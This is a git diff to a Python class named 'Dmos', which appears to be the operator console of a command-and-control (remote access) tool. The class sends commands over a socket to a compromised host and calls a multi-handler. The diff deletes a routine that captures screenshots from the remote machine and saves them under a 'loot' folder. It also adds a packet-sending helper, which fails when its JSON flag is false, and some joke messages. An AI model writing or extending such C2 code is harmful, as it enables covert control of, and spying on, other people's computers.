@@ -1,4 +1,4 @@
-import sys, os, threading, time, subprocess
+import sys, os, threading, time, subprocess, json
 from hashlib import md5
 from lib.helper import *
 from lib.debug import Debug
@@ -24,7 +24,6 @@ class Dmos:
 
 
     def interact(self):
-        conn = self.conn
         modules_multi = self.c2.modules_multi
         while 1:
             command = prompt(f"[{self.USERNAME}@{self.GLOBAL}]>> ", style=prompt_style)
@@ -43,11 +42,17 @@ class Dmos:
                 self.system_info()
             elif command == "fat":
                 self.conn.send(command.encode())
+                self.conn.send("yomama".encode())
+                self.conn.send("fat".encode())
             elif command == "clear":
                 os.system("clear")
             elif command == "b":
                 self.c2.multi_handler.cmdline()
                 pass
+
+    def send_packet(self, content, is_json=False):
+        if is_json : data = json.dumps(content) 
+        self.conn.send(data.encode())
 
     def free_dmos(self):
         self.conn.send("free".encode())
@@ -89,15 +94,4 @@ class Dmos:
         print("MGUID    : " + self.MGUID)
         print("HASH     : " + self.md5_hash)
         print("BORN     : " + self.born)
-    def screenshot(self):
-        self.conn.send("screenshot".encode())
-        # TODO: just fix this shit to be multi plat
-        DATE = subprocess.check_output("date", shell=True).rstrip(b'\n').decode("utf-8") + ".png"
-        path = os.path.join("./loot/screenshots/", DATE)
 
-        f = open(path, "wb")
-        image_data = b''
-        while b'FIN' not in (d := self.conn.recv(1024)): #FIN
-            image_data += d
-        f.write(image_data)
-        f.close()
